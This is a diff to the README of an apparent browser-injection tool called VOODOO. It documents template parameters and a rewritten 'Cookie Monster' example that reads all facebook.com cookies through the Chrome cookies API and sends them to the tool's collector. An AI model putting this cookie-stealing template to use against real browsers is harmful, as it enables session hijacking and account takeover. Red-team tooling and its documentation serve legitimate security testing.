@@ -287,12 +287,18 @@ Stop the collector thread.
 | options   | `object`  | addional configuration | `{}`
 | options.close_browser | `boolean`  | when set to `true` the browser process will be killed | `false`
 
+### Dynamic Parameters
+You can pass custom parameters to your template using the `--params` option, it accepts key value pairs in the following format `name:john age:42`.
+Those values could later be used in your script like that: `%{name}` `%{age}`.
+
+You can see an example template that uses parameters at `templates/cookie-monster.yaml`.
+
 ### Permissions
 The `permissions` property is used to declare the necessary permissions for your VOODOO script.
 By default VOODOO sets the following permissions:
 `tabs`, `*://*/*`, `webRequest`
 
-Adding the `cookies` permission, to extract `facebook.com` cookies from the browser.
+Here is an example of a template that uses the `cookies` permission to extract `facebook.com` cookies.
 ```yaml
 info:
   name: Cookie Monster
@@ -304,7 +310,10 @@ permissions:
 
 scripts:
   - content: |
-      chrome.cookies.getAll({domain: "facebook.com"}, VOODOO.send);
+      chrome.cookies.getAll({domain: "facebook.com"}, cookies => {
+        VOODOO.send(cookies)
+        VOODOO.kill();
+      });
     background: true
 ```
 
